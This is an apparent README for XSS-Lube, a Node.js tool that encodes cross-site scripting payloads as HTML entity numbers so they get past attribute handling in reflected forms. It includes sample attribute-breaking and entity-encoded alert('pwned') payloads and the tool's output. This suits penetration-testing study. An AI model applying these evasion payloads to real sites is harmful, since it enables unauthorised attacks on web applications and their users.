# XSS-Lube

A tool to assist penetrating pages with XSS code that needs to find its way into HTML attributes.

At times it can be quite challenging to inject XSS code when the code's contents will be interpreted as HTML. This is particularly true in server-side reflected XSS that involves exploitation of an HTML attributes which can require some fairly tedious string manipulation. In cases where HTML you're in an HTML element and manipulating an attribute, you'll not want certain reserved characters to be interpreted as HTML characters. 

## Conditions of Success
To date, this has been tested against PHP servers where form data is reflected on POST. Additional uses are yet to be tested.

### Example Problem
```html
<form action="/action_page.php" method="POST">
    <input id="password" name="password" type="password" value="<script>alert("pwned");</script>" />
    <input type="submit" value="Submit">
</form>
```
The above will break due to the use of several reserved characters. But, below will work to a limited degree, but only if you're directly manipulating the page. Otherwise, the injected script will not be received as input to the server and reflected back as `value=""/>` will be render before the script is reached and you'll only post an empty string.
```html
<form action="/action_page.php" method="POST">
    <input id="password" name="password" type="password" value=""/><script>alert("pwned");</script>"/>
    <input type="submit" value="Submit">
</form>
```

One can manually fiddle with these inputs by mapping out characters to their HTML Number Entities. For example: 
```html
<form action="/action_page.php" method="POST">
    <input id="password" name="password" type="password" value=&#34;&#47;&#62;&#13;&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#13;&#32;&#32;&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#112;&#119;&#110;&#101;&#100;&#33;&#34;&#41;&#59;&#13;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#13;&#60;&#13;/>
    <input type="submit" value="Submit">
</form>
```
But that's quite tedious for longer programs. Ideally, you'll get your exploit working with minimal struggle with string manipulation so you can save your time working out bigger problems.

## XSS-Lube to the Rescue
This tool will take a cleverly crafted text document and convert it's contents into [HTML Entity](https://developer.mozilla.org/en-US/docs/Glossary/Entity) Numbers, thereby circumventing some cases in which otherwise valid exploits are hampered by how a character is handled by the server or HTML renderer.

**Dependencies**: NodeJS - consider installing the [Node Version Manager (NVM)](https://github.com/nvm-sh/nvm) to resolve this dependency.

## Example Usage

Example (test.html):

```html
<script>
  alert("pwned!");
</script>
```

Run the following code:
```sh
npm run start test.html
```
Or, with Yarn:
```sh
yarn start test.html
```

And then observe the output:

```text
ub3rl33t@kali:~$ yarn start test.html

===============================================================
██╗  ██╗███████╗███████╗      ██╗     ██╗   ██╗██████╗ ███████╗
╚██╗██╔╝██╔════╝██╔════╝      ██║     ██║   ██║██╔══██╗██╔════╝
 ╚███╔╝ ███████╗███████╗█████╗██║     ██║   ██║██████╔╝█████╗
 ██╔██╗ ╚════██║╚════██║╚════╝██║     ██║   ██║██╔══██╗██╔══╝
██╔╝ ██╗███████║███████║      ███████╗╚██████╔╝██████╔╝███████╗
╚═╝  ╚═╝╚══════╝╚══════╝      ╚══════╝ ╚═════╝ ╚═════╝ ╚══════╝
===============================================================
TEST.HTML - Text to HTML Entity Number for XSS:
---------------------------(start)-----------------------------
&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#13;&#32;&#32;&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#112;&#119;&#110;&#101;&#100;&#33;&#34;&#41;&#59;&#13;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#13;
---------------------------(end)-----------------------------
```

The string of HTML Entity Numbers can be used in place of cumbersome characters in your exploit.

## Caution
As always, there is a lot of nuance in exploiting vulnerable web applications. And you have to gain and understanding of the environment. This tool will not work well in all cases. And, encoded text put into an input field will behave differently than text embedded into a page, etc. So, please temper your expectations. ^_^

## Obligatory Warning
Hacking is illegal, this tool is not intended for illegal activity and the author cannot be held responsible for such use. Please use responsibly either in your own home lab or for legitimate work where you've required established satisfactory legal, business, and moral grounds to perform any penetration testing. 
